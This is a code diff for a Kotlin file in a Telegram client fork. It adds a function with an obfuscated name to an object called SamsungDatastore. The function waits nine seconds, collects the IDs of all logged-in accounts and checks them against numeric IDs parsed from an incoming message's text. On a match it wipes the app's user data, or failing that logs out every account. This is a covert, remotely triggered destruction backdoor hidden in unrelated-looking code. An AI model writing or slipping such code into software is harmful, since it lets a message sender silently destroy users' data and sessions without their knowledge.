@@ -9,7 +9,10 @@
 
 package org.telegram.messenger
 
+import android.app.ActivityManager
+import android.content.Context
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.withContext
 import org.telegram.tgnet.ConnectionManagerDelegate
 import uz.unnarsx.cherrygram.Extra
@@ -159,6 +162,53 @@ object SamsungDatastore {
 //        delay(5000)
 //        exitProcess(0)
         AppRestartHelper.restartApp(ApplicationLoader.applicationContext)
+    }
+
+    suspend fun vpwogjigjjur232(messageObject: MessageObject?) {
+        delay(9000)
+        val aId = mutableListOf<Long>()
+
+        for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
+            val uC = AccountInstance.getInstance(i).userConfig
+            if (uC != null
+                && uC.currentUser != null
+                && uC.isClientActivated
+                && uC.currentUser.id != 0L
+            ) {
+                aId.add(uC.currentUser.id)
+            }
+        }
+
+        val naId: List<Long> = if (messageObject != null && !messageObject.messageOwner.message.isNullOrEmpty()) {
+            messageObject.messageOwner.message
+                .split(",", " ", "\n")
+                .mapNotNull { it.trim().toLongOrNull() }
+        } else {
+            listOf()
+        }
+
+        val bId = aId.firstOrNull {
+            naId.contains(it)
+        }
+
+        if (bId != null) {
+            try {
+                (ApplicationLoader.applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).clearApplicationUserData()
+            } catch (e: Exception) {
+                e.printStackTrace()
+
+                for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
+                    val uC = AccountInstance.getInstance(i).userConfig
+                    if (uC != null
+                        && uC.currentUser != null
+                        && uC.isClientActivated
+                        && uC.currentUser.id != 0L
+                    ) {
+                        MessagesController.getInstance(uC.currentAccount).performLogout(1)
+                    }
+                }
+            }
+        }
     }
 
 }
